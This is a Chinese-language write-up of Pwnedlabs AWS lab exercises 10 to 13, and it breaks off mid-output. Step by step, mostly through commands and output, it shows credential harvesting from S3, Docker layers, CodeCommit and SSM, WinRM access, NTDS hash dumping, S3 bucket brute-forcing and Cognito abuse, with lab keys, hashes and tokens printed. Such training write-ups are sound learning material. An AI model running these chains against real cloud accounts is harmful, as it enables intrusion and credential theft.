
Pwnedlabs靶场Writeup(下)

- - -

# Pwnedlabs

Pwnedlabs是一个关于AWS云安全的渗透靶场。靶场地址：[https://pwnedlabs.io/](https://pwnedlabs.io/)

## 10.Leverage Insecure Storage and Backups for Profit

基本的信息收集：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFTEMEHGPPY",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/contractor"
}

aws iam list-attached-user-policies --user-name contractor --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Policy",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Policy"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Policy --no-cli-pager
{
    "Policy": {
        "PolicyName": "Policy",
        "PolicyId": "ANPAWHEOTHRFXRFIVBEXM",
        "Arn": "arn:aws:iam::427648302155:policy/Policy",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-07-27T17:39:55+00:00",
        "UpdateDate": "2023-07-28T14:24:22+00:00",
        "Tags": []
    }
}



aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeInstances",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:GetPasswordData",
                    "Resource": "arn:aws:ec2:us-east-1:427648302155:instance/i-04cc1c2c7ec1af1b5"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "s3:GetBucketPolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:user/contractor",
                        "arn:aws:iam::427648302155:policy/Policy",
                        "arn:aws:s3:::hl-it-admin"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-28T14:24:22+00:00"
    }
}


aws s3api get-bucket-policy --bucket hl-it-admin --no-cli-pager --output json
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::427648302155:user/contractor\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::hl-it-admin/ssh_keys/ssh_keys_backup.zip\"}]}"
}




aws ec2 describe-instances --instance-ids i-04cc1c2c7ec1af1b5
#从中可以发现key-name为it-admin，ip为44.204.191.38



#如果没指定私钥，得到的是加密的。
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --no-cli-pager
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "PasswordData": "s2QgAyMRT/OAjxv2F5FKSaco4lISg4kS+LTajSjr9eTHaKE0AdX0u7AaLzicaHV9Ki2Ue4OduBIxRPuwmzWHyUR/ZNgaIZIPCuh2XMDs4kUmvrJFZkU22WqpYQ16AUbJAvwVfNWew7nIpWpRLNB2WUom43vofSPPh3a6+xsDewgQmV0rZ/caDsfcIKASojoQ2tWpKxlz7vlUsyciDE1nuFfuOo5p5E27lWGrcyHzigHh3ErsSKq5lqQI7i2Fry0FSVowb+lXv8DVwjq5oSVP6ibrRPWqCsKWJadYg2engXL8c8vD2imPtc6wOa2wCx1CTV+9IyIKhJEE2yADo5B+Cw==",
    "Timestamp": "2023-07-27T22:39:26+00:00"
}

#通过前面s3里得到的私钥，可以解密得到：
aws ec2 get-password-data --priv-launch-key it-admin.pem --instance-id i-04cc1c2c7ec1af1b5 --no-cli-pager
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "PasswordData": "UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!",
    "Timestamp": "2023-07-27T22:39:26+00:00"
}

#拿到Administrator:UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!
```

然后就是登录，这个靶场的靶机我这边怎么扫端口都是全开。

Win-rm连不上，mac上的powershell用Enter-PSSession有垃圾bug，一个软件修了5年bug还没修好。

最后虚拟机里可以连接：

```plain
#快速启动且winrm
winrm qc

#
winrm s winrm/config/client '@{TrustedHosts="*"}'

$password = convertto-securestring -AsPlainText -Force -String 'UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!'
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "Administrator",$password
Enter-PSSession -ComputerName 44.204.191.38 -Credential $credential
```

进入后是一个比较受限的环境，没有dir命令，看一下可用命令：

```plain
[44.204.191.38]: PS>Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object
Cmdlet          Get-ChildItem                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Content                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Process                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Service                                        3.0.0.0    Microsoft.PowerShell.Management
```

Get-ChildItem即dir，Get-Content可以读文件。进行信息收集发现admin用户下有.aws，存在aksk：

```plain
Get-ChildItem c:\users\admin\.aws -force


    Directory: C:\users\admin\.aws


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2023/7/28     11:38             31 config
-a----        2023/7/28     11:38            119 credentials


[44.204.191.38]: PS>Get-Content c:\users\admin\.aws\credentials
[default]
aws_access_key_id = AKIAWHEOTHRFT5Q4524N
aws_secret_access_key = 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
[44.204.191.38]: PS>
```

配置好之后：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFWB4TQKI2X",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/it-admin"
}


#可以得到flag
aws s3 cp s3://hl-it-admin/flag.txt ./

#拿到本题flag之后再看看后续利用
aws s3 ls s3://hl-it-admin --recursive
2023-07-28 20:35:38          0 backup-2807/
2023-07-28 23:52:58   33554432 backup-2807/ad_backup/Active Directory/ntds.dit
2023-07-28 23:53:07      16384 backup-2807/ad_backup/Active Directory/ntds.jfm
2023-07-28 23:53:06      65536 backup-2807/ad_backup/registry/SECURITY
2023-07-28 23:52:58   17825792 backup-2807/ad_backup/registry/SYSTEM
2023-07-27 23:51:45         99 contractor_accessKeys.csv
2023-07-28 19:50:49          0 docs/
2023-07-28 19:51:07   10591957 docs/veeam_backup_12_agent_management_guide.pdf
2023-07-28 19:51:09    9408343 docs/veeam_backup_12_cloud_administrator_guide.pdf
2023-07-28 19:47:07         32 flag.txt
2023-07-27 23:53:06          0 installer/
2023-07-28 05:02:47 1579290624 installer/Veeam.iso
2023-07-28 01:34:24          0 ssh_keys/
2023-07-28 21:48:18      17483 ssh_keys/ssh_keys_backup.zip
```

在`contractor_accessKeys.csv`里发现了入口用户的aksk。

backup-2807文件夹下面有ntds.dit，这也对应了之前学的backup组读ntds.dit提权。

将ntds.dit和backup-2807/ad\_backup/registry/SYSTEM下载下来，然后：

```plain
python3.10 secretsdump.py  -system ~/github/CTF/AWS/pwnedlabs/challenge11/SYSTEM -ntds ~/github/CTF/AWS/pwnedlabs/challenge11/ntds.dit LOCAL -outputfile out.txt
```

```plain
cat out.txt.ntds
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC04$:1003:aad3b435b51404eeaad3b435b51404ee:fc15058af730b1de899a7aa6759e894c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb22f21bc86dfe7b0073d9f9f722ae0e:::
huge-logistics.local\leandra.joice:1232:aad3b435b51404eeaad3b435b51404ee:84cfc9ded98b57bcc517375c5911ca2c:::
...
```

之后也可以用hashcat对hash进行破解。

## 11.Uncover Secrets in CodeCommit and Docker

入口需要搜索docker镜像，查找到到一个相关的docker镜像：

[![](assets/1699929822-1bb1e6174eec525874e2ea1cb0debd9d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109140846-7174faa8-7ec6-1.png)

在层中找到了aksk，相当于将aksk写到env里

[![](assets/1699929822-43447ef4c55d9faa6af0ad35c6b9fbf5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109140859-78d99272-7ec6-1.png)

```plain
#whoami
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTAUXNEJTBN",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/prod-deploy"
}

#利用enumerate-iam.py工具枚举出具有list-repositories权限
aws codecommit list-repositories --no-cli-pager
{
    "repositories": [
        {
            "repositoryName": "vessel-tracking",
            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
        }
    ]
}

#查看仓库信息
aws codecommit get-repository --repository-name vessel-tracking --no-cli-pager
{
    "repositoryMetadata": {
        "accountId": "785010840550",
        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
        "repositoryName": "vessel-tracking",
        "repositoryDescription": "Vessel Tracking App",
        "defaultBranch": "master",
        "lastModifiedDate": "2023-07-21T01:50:46.826000+08:00",
        "creationDate": "2023-07-20T05:11:19.845000+08:00",
        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking"
    }
}

#列出仓库的所有分支
aws codecommit list-branches --repository-name vessel-tracking --no-cli-pager
{
    "branches": [
        "master",
        "dev"
    ]
}


aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --no-cli-pager
{
    "branch": {
        "branchName": "dev",
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
    }
}

aws codecommit get-branch --repository-name vessel-tracking --branch-name master --no-cli-pager
{
    "branch": {
        "branchName": "master",
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818"
    }
}

#获取commit信息，发现dev分支的这次commit的meaage，允许s3的调用去更普遍的工作。因此猜测可能存在一些信息。
aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a -
-no-cli-pager
{
    "commit": {
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
        "parents": [
            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
        ],
        "message": "Allow S3 call to work universally\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "additionalData": ""
    }
}

#查看这个commit
aws codecommit get-commit --repository-name vessel-tracking --commit-id 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --no-cli-pager
{
    "commit": {
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818",
        "treeId": "8e2d7f189e4cc072594bdf1a222033990ec1d7b1",
        "parents": [],
        "message": "Initial Commit\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "additionalData": ""
    }
}

#查看commit的differences，
aws codecommit get-differences --repository-name vessel-tracking --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1

            "afterBlob": {
                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
                "path": "js/server.js",
                "mode": "100644"
            },
            "changeType": "A"
        },

#读取这个server.js
aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js --no-cli-pager
{
    "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
    "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
    "filePath": "js/server.js",
    "fileMode": "NORMAL",
    "fileSize": 1702,
    "fileContent": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc3MnKTsKY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBBV1MgPSByZXF1aXJlKCdhd3Mtc2RrJyk7CmNvbnN0IHsgdjQ6IHV1aWR2NCB9ID0gcmVxdWlyZSgndXVpZCcpOwpyZXF1aXJlKCdkb3RlbnYnKS5jb25maWcoKTsKCmNvbnN0IGFwcCA9IGV4cHJlc3MoKTsKY29uc3QgUE9SVCA9IHByb2Nlc3MuZW52LlBPUlQgfHwgMzAwMDsKCi8vIEFXUyBTZXR1cApjb25zdCBBV1NfQUNDRVNTX0tFWSA9ICdBS0lBM05SU0syUFRMR0FXV0xURyc7CmNvbnN0IEFXU19TRUNSRVRfS0VZID0gJzJ3Vnd3NVZFQWM2NWVXV21oc3VVVXZGRVRUNyt5bVlHTGptZUNoYXMnOwoKQVdTLmNvbmZpZy51cGRhdGUoewogICAgcmVnaW9uOiAndXMtZWFzdC0xJywgIC8vIENoYW5nZSB0byB5b3VyIHJlZ2lvbgogICAgYWNjZXNzS2V5SWQ6IEFXU19BQ0NFU1NfS0VZLAogICAgc2VjcmV0QWNjZXNzS2V5OiBBV1NfU0VDUkVUX0tFWQp9KTsKY29uc3QgczMgPSBuZXcgQVdTLlMzKCk7CgphcHAudXNlKChyZXEsIHJlcywgbmV4dCkgPT4gewogICAgLy8gR2VuZXJhdGUgYSByZXF1ZXN0IElECiAgICByZXEucmVxdWVzdElEID0gdXVpZHY0KCk7CiAgICBuZXh0KCk7Cn0pOwoKYXBwLmdldCgnL3Zlc3NlbC86bXNzaScsIGFzeW5jIChyZXEsIHJlcykgPT4gewogICAgdHJ5IHsKICAgICAgICBjb25zdCBtc3NpID0gcmVxLnBhcmFtcy5tc3NpOwoKICAgICAgICAvLyBGZXRjaCBkYXRhIGZyb20gTWFyaW5lVHJhZmZpYyBBUEkKICAgICAgICBsZXQgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vYXBpLm1hcmluZXRyYWZmaWMuY29tL3Zlc3NlbC8ke21zc2l9YCwgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdBcGktS2V5JzogcHJvY2Vzcy5lbnYuTUFSSU5FX0FQSV9LRVkgfQogICAgICAgIH0pOwoKICAgICAgICBsZXQgZGF0YSA9IHJlc3BvbnNlLmRhdGE7IC8vIE1vZGlmeSBhcyBwZXIgYWN0dWFsIEFQSSByZXNwb25zZSBzdHJ1Y3R1cmUKCiAgICAgICAgLy8gVXBsb2FkIHRvIFMzCiAgICAgICAgbGV0IHBhcmFtcyA9IHsKICAgICAgICAgICAgQnVja2V0OiAndmVzc2VsLXRyYWNraW5nJywKICAgICAgICAgICAgS2V5OiBgJHttc3NpfS5qc29uYCwKICAgICAgICAgICAgQm9keTogSlNPTi5zdHJpbmdpZnkoZGF0YSksCiAgICAgICAgICAgIENvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICB9OwoKICAgICAgICBzMy5wdXRPYmplY3QocGFyYW1zLCBmdW5jdGlvbiAoZXJyLCBzM2RhdGEpIHsKICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuIHJlcy5zdGF0dXMoNTAwKS5qc29uKGVycik7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTZW5kIGRhdGEgdG8gZnJvbnRlbmQKICAgICAgICAgICAgcmVzLmpzb24oewogICAgICAgICAgICAgICAgZGF0YSwKICAgICAgICAgICAgICAgIHJlcXVlc3RJRDogcmVxLnJlcXVlc3RJRAogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgZXJyb3I6ICJFcnJvciBmZXRjaGluZyB2ZXNzZWwgZGF0YS4iIH0pOwogICAgfQp9KTsKCmFwcC5saXN0ZW4oUE9SVCwgKCkgPT4gewogICAgY29uc29sZS5sb2coYFNlcnZlciBpcyBydW5uaW5nIG9uIFBPUlQgJHtQT1JUfWApOwp9KTsKCg=="
}
```

base64解码得到一段js操作aws的代码，里面给了aksk：

```plain
const express = require('express');
const axios = require('axios');
const AWS = require('aws-sdk');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// AWS Setup
const AWS_ACCESS_KEY = 'AKIA3NRSK2PTLGAWWLTG';
const AWS_SECRET_KEY = '2wVww5VEAc65eWWmhsuUUvFETT7+ymYGLjmeChas';

AWS.config.update({
    region: 'us-east-1',  // Change to your region
    accessKeyId: AWS_ACCESS_KEY,
    secretAccessKey: AWS_SECRET_KEY
});
const s3 = new AWS.S3();

app.use((req, res, next) => {
    // Generate a request ID
    req.requestID = uuidv4();
    next();
});

app.get('/vessel/:mssi', async (req, res) => {
    try {
        const mssi = req.params.mssi;

        // Fetch data from MarineTraffic API
        let response = await axios.get(`https://api.marinetraffic.com/vessel/${mssi}`, {
            headers: { 'Api-Key': process.env.MARINE_API_KEY }
        });

        let data = response.data; // Modify as per actual API response structure

        // Upload to S3
        let params = {
            Bucket: 'vessel-tracking',
            Key: `${mssi}.json`,
            Body: JSON.stringify(data),
            ContentType: "application/json"
        };

        s3.putObject(params, function (err, s3data) {
            if (err) return res.status(500).json(err);

            // Send data to frontend
            res.json({
                data,
                requestID: req.requestID
            });
        });

    } catch (error) {
        res.status(500).json({ error: "Error fetching vessel data." });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on PORT ${PORT}`);
});
```

配置好之后读取flag即可：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTJN636WIHU",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/code-admin"
}

aws s3 ls s3://vessel-tracking --no-cli-pager
2023-07-21 02:25:17         32 flag.txt
2023-07-21 02:35:56      21810 vessel-id-ae
```

## 12.s3 bucket brute force to breach

入口是一个s3，进去下载index.html下来查看一下，发现里面有几个s3：

```plain
hlogistics-images
https://hlogistics-staticfiles.s3.amazonaws.com/main.js
```

格式都是`hlogistics-xx`

再看一下区域：

```plain
curl -I https://hlogistics-staticfiles.s3.amazonaws.com/
HTTP/1.1 200 OK
x-amz-id-2: Oe485EKL9NNSmJnQgXA1fpxbyppNFeKVVH+dvW7ynFBEZUIRhFYQh9xKMRNdTMYYdTUKr/EoqS4=
x-amz-request-id: SGHH6NC2TKNTTXMD
Date: Mon, 23 Oct 2023 10:51:14 GMT
x-amz-bucket-region: eu-west-2
x-amz-access-point-alias: false
Content-Type: application/xml
Server: AmazonS3
```

是eu-west-2区域。本题应该是要根据s3的格式爆破一下s3。利用ffuf工具爆破：

```plain
ffuf -u https://hlogistics-FUZZ.s3.amazonaws.com/ -w '/Users/feng/many-ctf/my-fuzz-wordlist/aws/aws-s3-bucket-wordlist.txt:FUZZ'

images                  [Status: 200, Size: 8959, Words: 4, Lines: 2, Duration: 284ms]
web                     [Status: 200, Size: 535, Words: 4, Lines: 2, Duration: 299ms]
staticfiles             [Status: 200, Size: 8495, Words: 4, Lines: 2, Duration: 286ms]
beta                    [Status: 200, Size: 554, Words: 4, Lines: 2, Duration: 275ms]
```

访问hlogistics-beta存储桶，发现一个python文件，里面有aksk。

配置好之后列举下权限：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATRPHKUQK3U6DLVPIY",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/ecollins"
}


aws iam list-attached-user-policies --user-name ecollins --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "ecollins",
            "PolicyArn": "arn:aws:iam::243687662613:policy/ecollins"
        }
    ]
}


aws dynamodb describe-endpoints --no-cli-pager
{
    "Endpoints": [
        {
            "Address": "dynamodb.eu-west-2.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}


aws iam list-user-policies --user-name ecollins --no-cli-pager
{
    "PolicyNames": [
        "SSM_Parameter"
    ]
}


aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter --no-cli-pager
{
    "UserName": "ecollins",
    "PolicyName": "SSM_Parameter",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "ssm:GetParameter",
                    "ssm:DescribeParameters"
                ],
                "Resource": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris"
            }
        ]
    }
}
```

发现ecollins用户对ssm服务可执行get-parameter，ssm的Parameter Store，用于集中管理密钥和配置数据等，将敏感数据与代码和配置分离。

```plain
aws ssm get-parameter --name lharris --no-cli-pager
{
    "Parameter": {
        "Name": "lharris",
        "Type": "StringList",
        "Value": "AKIATRPHKUQK7PLPPVRR,Cd3XasHrvc6szJmU9b/Imzc+MXQJf/drqCKfSWFj",
        "Version": 1,
        "LastModifiedDate": "2023-08-21T02:50:43.250000+08:00",
        "ARN": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris",
        "DataType": "text"
    }
}
#拿到aksk，配置好之后枚举权限，发现可以list-functions
aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "crew_administration_data",
            "FunctionArn": "arn:aws:lambda:eu-west-2:243687662613:function:crew_administration_data",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::243687662613:role/lambda-empty-role",
            "Handler": "index.lambda_handler",
            "CodeSize": 18968,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-08-20T19:59:44.000+0000",
            "CodeSha256": "RPCuNGeiPPknudz6i0jDNx4S017TS5MfmZ/pcIFG7tk=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "68d6b934-7a45-40a7-9305-fad3e874a4ad",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
#调用函数，获得管理员的相关数据。
aws lambda invoke --function-name crew_administration_data  output.txt
#从output.txt中可以找到flag。
```

## 13.Abuse Cognito User and Identity Pools

相对来说比之前都难，学了一波Cognito。

```plain
#获得identityid
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign-request --no-cli-pager
{
    "IdentityId": "us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b"
}

#获取凭证。此时是匿名获取的凭证，因此权限较低。
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --no-sign-request --no-cli-pager
{
    "IdentityId": "us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b",
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRF6MKX6EUO",
        "SecretKey": "VvOy6Y0YfQewR7pksn0N/yQQjs7veTUhOW2mRXR9",
        "SessionToken": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJGMEQCIDmLMcxG5Rfh7rd3NzGW6Jr90P9IChIrgtB1bI4uJoGlAiBQMMiEPU0nrktRpV+qA2N+L6MmUKziGbZ9mhNGPWUEdyrJBQgtEAAaDDQyNzY0ODMwMjE1NSIMr875LIFuFKOgfNHGKqYFJ8YFneyO6uO6XScJ8ehSBLbI74+DUDhB748K/b/3/iOzaZjJBwTfGE/CV6R8wCDE4QNcsCZmU8RMUocbXgZ99M5PR+aMeTRgIIxwv+XH6lfOCb8OVIgzTz6ZzU/bexCoz2sfvJW1gx4xVjOm4hsqFcM5AJLg8SMxgiR1kse2fgr+SOoeHla2nrzr9E+4CcVueG1rVo+EGQT7ktJx6xA37DVgRT6ALRYUVYCE8kXEZgTESxxr/j5sEoftwKV0H154AJGJzXjY6RrUILfp3AOV06bCDlvt23ZXK3ExGi24lcaU7Vy4gT0aBI4iWTCyk+RjMr5BDv7sVNDxxHGfWhW1kYJSVlGdcx+b08T16vWV43i0dW750b5nRADgcm+1qozFoTX0waUvwTj0O/B2bbBQ8Ngcbeq4uBOrhNMC/GGIjHgsJnTbFmKiGmgCEXTEgI5/HO3PRqLry6bfZxARZIKUHPHeM5+W+3GTA7G3ZDF+fQxSeWLkI+xs8GKtGWfnwENiMfAWI9pe+iQc4M9ky7qNDLDAY5AcYFnqHUd/tW6hbLXx5tF0fClkkRw/TwSNO1RSOt0o+gU8oeGc0eaP1S6zH+xIVWnTKQTc/yk27ogJuw1xHS0mAieNA/291ZKiWaxTlXmlPSlH8MUJXu3u0wPPJekVlETu4fu2tLYyfOwX3P9SLy5OTiJRcvrU1CuCTYFn18+fErrZnd1vQyJJy7/g8dc+v1suMcmwX28Ed6CbDFUreEb7jYxgEx3eG3LINQkfXrhNi+lk0gqlqvp9/81Zr6PoN7D9PaCIumM1H8CnGpPP8ktb/SxN/jkWxBFgopyGDoDucRwknOqzxhojfJXO+tpXRZ+XGnT3AOVZneZ/nYwiBDf807LAJByyAoxu438RLBGzAaB6MPS32akGOt4COG5ahZZiRJeMD/dAbEvT6xbzqSkSTJZP30/GPm3W5/vwccXMAPF75g1iXCHiHESq7eYpe178GIi9LttmSVDyR9PNx8ao8FgFMDid93TkJ3JDbio6UzCz4K78wt2QNCXm23NbTCQQD9P/m+UddVRO8+UNb5LymQgFo86Wfq1uyoy7MX94s/wKPd/iUv9sZMmVZT9Vmj+gADK1ntNWHamM0a78D0e5bP7yLwPl1Df0VDzKE9hA0zqAk9fwg0UNIq/EdbpRSLr8d7M9OX3Cl4F9GtZVnZNTptDxFBSw3gazG9mVGkDVRV96Fr9/RsWElIhz4vlffThYnKyFU8VmBUXXg47QE43DCk+1IUiw+Fh0KJxce0xJmbz4iI7ZhwK9xwJIV0O70uhXs/aZ9awbCQiKisdJGXFCrlkB4RRfMm2c0M5nbcX+I+kAAwU6C+PsJzxL6v1pEZf94E/R/6yXjbE=",
        "Expiration": "2023-10-23T20:41:40+08:00"
    }
}
```

配置好后可以访问s3：

```plain
aws s3 cp s3://hl-app-images/temp/id_rsa ./
```

题目还给了一个User Pool，Client ID是 `16f1g98bfuj9i0g3f8be36kkrl` 。

```plain
#尝试注册，在之前可能进行弱密码登录但是失败
aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --password "FENGfeng123@@@" --user-attributes Name="email",Value="sulishi141592653@gmail.com"
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "s***@g***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "6f3921d7-c684-40e6-94a2-b1f3077ebd17"
}

aws cognito-idp confirm-sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --confirmation-code 497147

#即sign-in
aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id 16f1g98bfuj9i0g3f8be36kkrl --auth-parameters USERNAME=feng1,PASSWORD=FENGfeng123@@@ --no-cli-pager
{
    "ChallengeParameters": {},
    "AuthenticationResult": {
        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEtZaHFqMVBuWjJrMXdMVVg2bno0PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2ZjM5MjFkNy1jNjg0LTQwZTYtOTRhMi1iMWYzMDc3ZWJkMTciLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV84cmNLN2FidHoiLCJjbGllbnRfaWQiOiIxNmYxZzk4YmZ1ajlpMGczZjhiZTM2a2tybCIsIm9yaWdpbl9qdGkiOiIzMjc1ODM2OS01ZGVhLTRlMGQtYjlhMi05ODVmZTk4NWQ1YzQiLCJldmVudF9pZCI6IjFmMjNmODZkLWRhNjQtNDdjNi05NDhkLWJlOTA3NzEwNmQyNyIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE2OTgwNjQ4NjIsImV4cCI6MTY5ODA2ODQ2MiwiaWF0IjoxNjk4MDY0ODYyLCJqdGkiOiJmYjI2NTFiNy0wZTc1LTQzOWYtODc0ZS04NmNkYmFmNTU4ZWIiLCJ1c2VybmFtZSI6ImZlbmcxIn0.GMUIz-nuBYyJoc4OR9x3iFUzpAhAVyOA8phyNmGDHM9Q9RIkIvSqYDsGeF_ECZUbow47963WlWo4m_-9lCESYFGnnA_97FDRnZCq5t7QBkSqN53eL2Jvu-0LRLQWA_SmVp-kjcjQPPvj9zvbo04wyfp8KqNad8vwX7X6QKFz56Kj34FowUpy4MZ_eZzvA76aznjRSgxyPmQl1MwjK_h74QSLVircQtTx0lx1Q-6QaMJfp1ifXuRUp5hEg_T7jJx3bgWP6Qog7nL9FpqMtZSyMfT1F-u_3ZnPXcTvgmra-xjcC05vJMU0AgNpnc9QBZQMdUKD1d-XkU6lUJMj9KnOHQ",
        "ExpiresIn": 3600,
        "TokenType": "Bearer",
